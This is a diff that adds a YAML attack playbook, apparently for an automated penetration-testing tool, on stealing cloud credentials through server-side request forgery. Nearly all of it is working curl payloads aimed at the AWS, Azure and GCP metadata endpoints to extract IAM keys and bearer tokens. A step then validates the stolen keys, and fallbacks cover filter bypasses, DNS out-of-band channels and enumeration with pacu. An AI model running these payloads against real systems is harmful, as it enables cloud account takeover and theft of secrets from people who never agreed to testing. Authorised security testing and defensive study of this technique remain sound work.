@@ -1,0 +1,55 @@
+id: web_ssrf_cloud_metadata
+title: "SSRF → cloud metadata service credential theft"
+phase: web
+mitre: ["T1190", "T1552.005", "T1078.004"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: ["aws", "azure", "gcp", "kubernetes"]
+  cves: []
+keywords:
+  - "ssrf"
+  - "imds"
+  - "169.254.169.254"
+  - "metadata service"
+  - "iam credentials"
+  - "managed identity"
+  - "gce metadata"
+  - "imdsv2"
+preconditions:
+  - "Identified SSRF sink (URL parameter, file uploader fetching external URLs, webhook tester, PDF render service)"
+  - "Target deployed in AWS / Azure / GCP — confirmed by ASN lookup or response headers"
+steps:
+  - tool: curl
+    cmd:  "curl -s -X POST -d 'url=http://169.254.169.254/latest/meta-data/' {base_url}/{ssrf_endpoint}"
+    why:  "AWS IMDSv1 — reachable directly when SSRF sink follows redirects / no host filter"
+  - tool: curl
+    cmd:  "curl -s -X POST -d 'url=http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600 -X PUT' {base_url}/{ssrf_endpoint}"
+    why:  "AWS IMDSv2 — must request token first, then pass via header on subsequent calls"
+  - tool: curl
+    cmd:  "curl -s -X POST -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' {base_url}/{ssrf_endpoint}"
+    why:  "AWS — list IAM role names attached to the instance"
+  - tool: curl
+    cmd:  "curl -s -X POST -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}' {base_url}/{ssrf_endpoint}"
+    why:  "AWS — exfiltrate AccessKeyId + SecretAccessKey + Token"
+  - tool: curl
+    cmd:  "curl -s -X POST -d 'url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H Metadata:true' {base_url}/{ssrf_endpoint}"
+    why:  "Azure IMDS — Metadata header is mandatory"
+  - tool: curl
+    cmd:  "curl -s -X POST -d 'url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ -H Metadata:true' {base_url}/{ssrf_endpoint}"
+    why:  "Azure managed identity → bearer token for ARM API"
+  - tool: curl
+    cmd:  "curl -s -X POST -d 'url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H Metadata-Flavor:Google' {base_url}/{ssrf_endpoint}"
+    why:  "GCP — compute service account access token"
+  - tool: aws-cli
+    cmd:  "AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws sts get-caller-identity"
+    why:  "Confirm exfiltrated credentials are valid"
+expected_outcome: "Cloud-IAM credentials with the EC2/Function/Pod's role permissions"
+fallbacks:
+  - "If host filter blocks 169.254.169.254 → try DNS rebinding, decimal/octal encoding, or alt resolver"
+  - "Container target (k8s) → http://169.254.169.254/computeMetadata/ or http://kubernetes.default.svc/api"
+  - "If only outbound DNS allowed → DNS-based SSRF via burp collaborator / interactsh"
+  - "Run scoutsuite or pacu against exfiltrated keys to enumerate cloud blast radius"
+references:
+  - "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery"
+  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
